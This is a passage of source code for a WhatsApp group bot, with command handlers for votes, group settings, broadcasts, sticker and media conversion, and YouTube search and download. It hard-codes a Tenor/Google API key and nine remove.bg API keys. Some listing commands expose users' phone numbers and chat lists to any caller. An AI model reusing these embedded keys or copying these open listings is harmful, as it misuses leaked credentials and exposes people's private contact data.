            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`
            if (!text) throw `Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`
            m.reply(`Vote dimulai!\n\n*${prefix}upvote* - for sure\n*${prefix}devote* - for devote\n*${prefix}cekvote* - to check the vote\n*${prefix}deletevote* - to delete votes`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

â”Œã€” UPVOTE ã€•
â”‚ 
â”œ Total: ${vote[m.chat][1].length}
â”‚
â”‚ 
â””â”€â”€â”€â”€

â”Œã€” DEVOTE ã€•
â”‚ 
â”œ Total: ${vote[m.chat][2].length}
â”‚
â”‚ 
â””â”€â”€â”€â”€

*${prefix}deletevote* - to delete votes`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: 'ðš„ð™¿ðš…ð™¾ðšƒð™´'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: 'ð™³ð™´ðš…ð™¾ðšƒð™´'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: XeonBotInc.user.name,
                buttons: buttonsVote,
                headerType: 1
            }
            XeonBotInc.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'You have Voted'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

â”Œã€” UPVOTE ã€•
â”‚ 
â”œ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `â”œ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
â”‚ 
â””â”€â”€â”€â”€

â”Œã€” DEVOTE ã€•
â”‚ 
â”œ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `â”œ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
â”‚ 
â””â”€â”€â”€â”€

*${prefix}deletevote* - to delete votes`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: 'ðš„ð™¿ðš…ð™¾ðšƒð™´'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: 'ð™³ð™´ðš…ð™¾ðšƒð™´'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer: XeonBotInc.user.name,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            XeonBotInc.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'devote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'You have Voted'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

â”Œã€” UPVOTE ã€•
â”‚ 
â”œ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `â”œ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
â”‚ 
â””â”€â”€â”€â”€

â”Œã€” DEVOTE ã€•
â”‚ 
â”œ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `â”œ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
â”‚ 
â””â”€â”€â”€â”€

*${prefix}deletevote* - to delete votes`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: 'ðš„ð™¿ðš…ð™¾ðšƒð™´'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: 'ð™³ð™´ðš…ð™¾ðšƒð™´'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: XeonBotInc.user.name,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            XeonBotInc.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case 'checkvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

â”Œã€” UPVOTE ã€•
â”‚ 
â”œ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `â”œ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
â”‚ 
â””â”€â”€â”€â”€

â”Œã€” DEVOTE ã€•
â”‚ 
â”œ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `â”œ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
â”‚ 
â””â”€â”€â”€â”€

*${prefix}deletevote* - to delete votes


Â©${XeonBotInc.user.id}
`
XeonBotInc.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
            delete vote[m.chat]
            m.reply('Successfully Deleted Vote Session In This Group')
	    }
            break
case 'group': case 'grup': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === 'close'){
                    await XeonBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`*Successfully Closed The Group*`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`*Successfully Opened The Group*`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, `Mode Group`, botname, m)

             }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
                await XeonBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`*Successfully Opened Edit Group Info*`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await XeonBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`*Successfully Close Edit Group Info*`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, `Mode Edit Info`, botname, m)

            }
            }
            break
case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
XeonBotInc.sendMessage(m.chat, { text: xeonkak }, { quoted: m })
break
case 'mute': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`It's Been Active Before`)
                db.data.chats[m.chat].mute = true
                m.reply(`${XeonBotInc.user.name} has been muted in this group !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Not Activated Before`)
                db.data.chats[m.chat].mute = false
                m.reply(`${XeonBotInc.user.name} has been unmuted in this group !`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, `Mute Bot`, botname, m)
                }
             }
             break
case 'chatinfo': {
if (!m.quoted) m.reply('Reply Message')
let msg = await m.getQuotedObj()
if (!m.quoted.isBaileys) return m.reply('The message was not sent by a bot!')
let teks = ''
for (let i of msg.userReceipt) {
let read = i.readTimestamp
let unread = i.receiptTimestamp
let waktu = read ? read : unread
teks += `${global.themeemoji} @${i.userJid.split('@')[0]}\n`
teks += ` â”—â”${global.themeemoji} *Time :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ${global.themeemoji} *Status :* ${read ? 'Read' : 'Sent'}\n\n`
}
XeonBotInc.sendTextWithMentions(m.chat, teks, m)
}
break
            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                let response = await XeonBotInc.groupInviteCode(m.chat)
                XeonBotInc.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Enter the value enable/disable'
                if (args[0] === 'enable') {
                    await XeonBotInc.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await XeonBotInc.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'The message was not sent by a bot!'
                XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'report': case 'bug': {
            	if (!text) throw `Example : ${prefix + command} Report an error feature`
               let ownernya = ownernomer + '@s.whatsapp.net'
               let me = m.sender
               let pjtxt = `Message From : @${me.split('@')[0]} \nFor : @${ownernya.split('@')[0]}\n\n${text}`
               let ments = [ownernya, me]
               let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'ðŸ™THANKS FOR THE REPORT' }, type: 1 }]
            await XeonBotInc.sendButtonText(ownernya, buttons, pjtxt, botname, m, {mentions: ments})
            let akhji = `Report Sent\nTo Owner @${ownernya.split('@')[0]}\n*Thank you for the reportðŸ™*\n_Your number will be blocked_\n_If the Report is Only Created_`
            await XeonBotInc.sendButtonText(m.chat, buttons, akhji, botname, m, {mentions: ments})
            }
            break
            
            case 'bctext': case 'broadcasttext': case 'broadcast':
			    if (!isCreator) throw mess.owner
		            if (!text) throw `Enter text`
		                            var data = await store.chats.all()
                            for (let i of data) {
                               XeonBotInc.sendMessage(i.id, {text: `${ownername}'s Broadcast\n\nMessage : ${q}` })
                               await sleep(1000)
                            }
                            break
case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if(!isCreator) throw mess.owner
        if (!text) throw `enter text`
        let getGroups = await XeonBotInc.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        m.reply(` Broadcasting in ${xeoncast.length} Group Chat, in ${xeoncast.length * 1.5} seconds`)
        for (let i of xeoncast) {
let txt = `${ownername}'s Broadcast\n\nMessage : ${text}`
if(/image/.test(mime)) {
let media = await quoted.download()
await XeonBotInc.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await XeonBotInc.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        m.reply(`Successfuly Broadcasted in ${xeoncast.length} Groups`)      
        break
            case 'q': case 'quoted': {
		if (!m.quoted) return m.reply('Reply Message!!')
		let wokwol = await XeonBotInc.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('The message you replied to does not contain a reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listpc': {
                 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
                 for (let i of anulistp) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n\n`
                 }
                 XeonBotInc.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
                 for (let i of anulistg) {
                     let metadata = await XeonBotInc.groupMetadata(i)
                     teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Africa/Cairo').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n\n`
                 }
                 XeonBotInc.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'listonline': case 'onlinelist': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    XeonBotInc.sendText(m.chat, 'Online Member:\n\n' + online.map(v => '${themeemoji} @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
            if (!quoted) throw `*Reply Video/Image With Caption* ${prefix + command}`
            m.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('*Maximum 10 seconds!*')
                let media = await quoted.download()
                let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                throw `*Send Image/Video With Caption* ${prefix + command}\nDuration *Video 1-9 Seconds*`
                }
            }
            break
            case 'ebinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { eBinary } = require('./lib/binary')
            let eb = await eBinary(text)
            m.reply(eb)
        }
        break
            case 'dbinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { dBinary } = require('./lib/binary')
            let db = await dBinary(text)
            m.reply(db)
        }
        break
case 'buypreim':
m.reply(`Chat owner bro, please type .owner`)
break
  case 'addprem':
if (!isCreator) throw mess.owner
if (!q) return m.reply(`Enter the sample number\n\nExample: \n${prefix}${command} 916909137213`)
if(isNaN(q)) return await m.reply('must be a number')
  if (q.includes(`+`)) return m.reply('Do not use + direct number 9169****')
prmi = args.join(" ")
premium.push(`${prmi}@s.whatsapp.net`)
fs.writeFileSync('./database/user/premium.json', JSON.stringify(premium))
m.reply(`* PREMIUM ADDED *\n\n${themeemoji} *ID*: ${prmi}`)
break
case 'delprem':
 case 'dellprem':
if (!isCreator) throw mess.owner
  if (!q) return m.reply(`Enter the Number\n\nExample: \n${prefix}${command} 916909137213`)
  if(isNaN(q)) return await m.reply('must be a number')
  if (q.includes(`+`)) return m.reply('Do not use + direct number 9169****')
  prmin = `${q}@s.whatsapp.net`
anul = banned.indexOf(prmin)
premium.splice(anul, 1)
fs.writeFileSync('./database/user/premium.json', JSON.stringify(premium))
m.reply(`Success deleting premium ${prmi}`)
break
            case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) throw `Example : ${prefix + command} ðŸ˜…+ðŸ¤”`
		if (!emoji2) throw `Example : ${prefix + command} ðŸ˜…+ðŸ¤”`
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	case 'emojimix2': {
	    if (!text) throw `Example : ${prefix + command} ðŸ˜…+ðŸ¤”`
		let anumix2 = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anumix2.results) {
		    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
         case 'tts': case 'say':{
         	if (!text) throw `Example : ${prefix + command} text`
             let tts = await fetchJson(`https://api.akuari.my.id/texttovoice/texttosound_english?query=${text}`)
             XeonBotInc.sendMessage(m.chat, { audio: { url: tts.result }, mimetype: 'audio/mp4', ptt: true, fileName: `${text}.mp3` }, { quoted: m })
         	}
         break 
	case 'smeme': case 'stickermeme': case 'stickmeme': {
let { TelegraPh } = require('./lib/uploader')
if (!text) return m.reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
if (text.includes('|')) return m.reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
if (!/image/.test(mime)) return m.reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
m.reply(mess.wait)
mee = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`
memek = await XeonBotInc.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break
case 'toimage': case 'toimg': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `Reply sticker with caption *${prefix + command}*`
                m.reply(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let bufferimg13x = fs.readFileSync(ran)
                    XeonBotInc.sendMessage(m.chat, { image: bufferimg13x }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
case 'tomp4': case 'tovideo': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `reply sticker with caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await XeonBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`
            if (!quoted) throw `Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            XeonBotInc.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) throw `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`
            if (!quoted) throw `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            XeonBotInc.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${XeonBotInc.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`
            if (!quoted) throw `Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            XeonBotInc.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
                if (!quoted) throw 'Reply video'
                if (!/webp/.test(mime)) throw `reply sticker with caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await XeonBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'imagenobg': case 'removebg': case 'remove-bg': {
	    if (!quoted) throw `Send/Reply Image With Caption ${prefix + command}`
	    if (!/image/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
	    if (/webp/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await XeonBotInc.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    m.reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    XeonBotInc.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
	    case 'yts': case 'ytsearch': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("youtube-yts")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n\n`
                }
                XeonBotInc.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
        case 'google': {
                if (!text) throw `Example : ${prefix + command} fatih arridho`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `${themeemoji} *Title* : ${g.title}\n`
                teks += `${themeemoji} *Description* : ${g.snippet}\n`
                teks += `${themeemoji} *Link* : ${g.link}\n\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n\n`
                } 
                m.reply(teks)
                })
                }
                break
case 'video': { 
if (!text) return m.reply(`Example : ${prefix + command} Stay jb`)
            let ytsvideo = require("youtube-yts")
            let videosearch = await ytsvideo(text)
            listSerch = []
            teskd = `\nSearched Video: ${text}\n`
            for (let i of videosearch.all) {
                listSerch.push({
                    title: i.title,
                    rowId: `${prefix}ytmp4 ${i.url}`,
                    description: `Duration: ${i.timestamp}`
                })
            }
            let sections = [
                {
                    title: "Top " + videosearch.all.length + " videos thats matches search result",
                    rows: listSerch
                }
            ]
            const listMessage = {
                text: teskd,
                footer: botname,
                title: ``,
                buttonText: "Videos",
                mentions: parseMention(teskd), sections
            }
            return XeonBotInc.sendMessage(m.chat, listMessage, {
                quoted: m
            })
            }
        break    
        case 'song':{
        if (!text) return m.reply(`Example : ${prefix + command} stay jb`)
            let ytslagu = require("youtube-yts")
            let lagusearch = await ytslagu(text)
            listSerch = []
            teskd = `Searched Song: ${text}\n`
            for (let i of lagusearch.all) {
                listSerch.push({
                    title: i.title,
                    rowId: `${prefix}ytmp3 ${i.url}`,
                    description: `Duration: ${i.timestamp}`
                })
            }
            const sections = [
                {
                    title: "Top " + lagusearch.all.length + " songs that matched search result",
                    rows: listSerch
                }
            ]
            const listMessage = {
                text: teskd,
                footer: botname,
                title: ``,
                buttonText: "Songs",
                mentions: parseMention(teskd), sections
            }
            return XeonBotInc.sendMessage(m.chat, listMessage, {
                quoted: m
            })
            }
            break
        
    case 'play': case 'ytplay':{
                if (!text) throw `Example : ${prefix + command} anime whatsapp status`
                let yts = require("youtube-yts")
                let search = await yts(text)
                let anulay = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                    {buttonId: `playmp3 ${anulay.url}`, buttonText: {displayText: 'â™« Audio'}, type: 1},
                    {buttonId: `playmp4 ${anulay.url}`, buttonText: {displayText: 'â–º Video'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anulay.thumbnail },
                    caption: `
${themeemoji} Title : ${anulay.title}
${themeemoji} Ext : Search
${themeemoji} ID : ${anulay.videoId}
${themeemoji} Duration : ${anulay.timestamp}
${themeemoji} Viewers : ${anulay.views}
${themeemoji} Upload At : ${anulay.ago}
${themeemoji} Author : ${anulay.author.name}
${themeemoji} Channel : ${anulay.author.url}
${themeemoji} Description : ${anulay.description}
${themeemoji} Url : ${anulay.url}`,
                    footer: botname,
                    buttons: buttons,
                    headerType: 4
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case 'playmp3': //credit: Ray Senpai â¤ï¸ https://github.com/EternityBots/Nezuko
if (!text) throw `Example : ${prefix + command} anime whatsapp status`
const xeonplaymp3 = require('./lib/ytdl2')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await xeonplaymp3.mp3(anup3k.url)
await XeonBotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
break
case 'playmp4': //credit: Ray Senpai â¤ï¸ https://github.com/EternityBots/Nezuko
if(!text) throw `Example : ${prefix + command} anime whatsapp status`
const xeonplaymp4 = require('./lib/ytdl2')
let ytsmp4 = require("youtube-yts")
        let xeonsearch13 = await ytsmp4(text)
        let anuvidoke4 = xeonsearch13.videos[0]
const pl2= await xeonplaymp4.mp4(anuvidoke4.url)
await XeonBotInc.sendMessage(m.chat,{
    document: {url:pl2.videoUrl},
    fileName: anuvidoke4.title + '.mp4',
    mimetype: 'video/mp4',
    contextInfo:{
        externalAdReply:{
            title:anuvidoke4.title,
            body: botname,
            thumbnail: await fetchBuffer(anuvidoke4.thumbnail),
            mediaType:2,
            mediaUrl:anuvidoke4.url,
        }

    },
},{quoted:m})
break
case 'ytmp3': case 'ytaudio': //credit: Ray Senpai â¤ï¸ https://github.com/EternityBots/Nezuko
const xeonaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonaudp3.isYTUrl(text)) throw `Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`
const audio=await xeonaudp3.mp3(text)
await XeonBotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
